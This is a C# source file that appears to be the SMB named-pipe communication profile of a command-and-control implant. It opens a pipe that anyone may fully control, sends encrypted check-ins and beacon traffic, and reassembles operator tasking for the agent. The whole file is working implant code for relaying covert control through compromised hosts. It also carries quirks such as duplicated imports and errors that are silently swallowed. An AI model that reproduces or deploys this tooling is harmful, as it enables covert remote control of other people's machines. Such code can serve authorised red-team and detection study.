﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Models;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;
using Agent.Models;
using Agent.Profiles.Smb;
using System.Collections.Concurrent;
using System.Text;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Agent.Profiles
{
    public class SmbProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName = "pipename";
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public SmbProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
            if (OperatingSystem.IsWindows())
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += async (sender, args) => await OnMessageReceive(args);
            this.serverPipe.StartAsync(this.cancellationTokenSource.Token);
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe
            logger.Log($"Starting Checkin Process");

            await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for a checkin response message
            checkinAvailable.Wait();
            
            //We got a checkin response, so let's finish the checkin process
            logger.Log($"Checkin Available Triggered");
            this.checkedin = true;

            return this.cir;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    continue;
                }

                try
                {
                    await this.Send(await messageManager.GetAgentResponseStringAsync());
                }
                catch (Exception e)
                {
                    logger.Log($"Beacon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        internal async Task<string> Send(string json)
        {
            if (!connected)
            {
                logger.Log($"Waiting for connection event...");
                onClientConnectedSignal.WaitOne();
                logger.Log($"Connect Receieved");
            }

            try
            {
                json = this.crypt.Encrypt(json);
                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message"
                };

                IEnumerable<string> parts = json.SplitByLength(4000);

                logger.Log($"Sending message with size of {json.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    sm.delegate_message = part;

                    if (part == parts.Last())
                    {
                        sm.final = true;
                    }
                    logger.Log($"Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");

                    await this.serverPipe.WriteAsync(sm);
                }

                logger.Log($"Done writing message to pipe.");

            }
            catch (Exception e)
            {
                this.connected = false;
            }

            return String.Empty;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();

            return true;
        }

        private async Task SendSuccess()
        {
            //Indicate the server that we're done processing the message and it can send the next one (if it's there)
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                message_type = "success",
                final = true,
                delegate_message = String.Empty
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private async Task SendUpdate()
        {
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                final = true,
                message_type = "path_update",
                delegate_message = this.agentConfig.uuid
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            //Event handler for new messages

            logger.Log($"Message received from pipe {args.Message.delegate_message.Length} bytes");
            try
            {
                if (args.Message.message_type == "success")
                {
                    return;
                }

                this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists

                this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);

                if (args.Message.final)
                {
                    this.OnMessageReceiveComplete(this.partialMessages[args.Message.guid].ToString());
                    this.partialMessages.TryRemove(args.Message.guid, out _);
                }

                await this.SendSuccess();
            }
            catch (Exception e)
            {
                logger.Log($"Error in SMB Forwarder: {e}");
            }
        }

        private async Task OnClientConnection()
        {
            logger.Log($"New Client Connected!");
            onClientConnectedSignal.Set();
            this.connected = true;
            await this.SendUpdate();
        }

        private async Task OnClientDisconnect()
        {
            logger.Log($"Client Disconnected.");
            this.connected = false;
            onClientConnectedSignal.Reset();
            this.partialMessages.Clear();
        }

        private async void OnMessageReceiveComplete(string message)
        {
            //If we haven't checked in yet, the only message this can really be is a checkin.
            if (!checkedin)
            {
                cir = JsonSerializer.Deserialize(this.crypt.Decrypt(message), CheckinResponseJsonContext.Default.CheckinResponse);
                checkinAvailable.Set();
                return;
            }

            //If we make it to here, it's a tasking response
            GetTaskingResponse gtr = JsonSerializer.Deserialize(message, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
            if (gtr == null)
            {
                return;
            }

            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
            this.SetTaskingReceived(this, tra);
        }
    }
}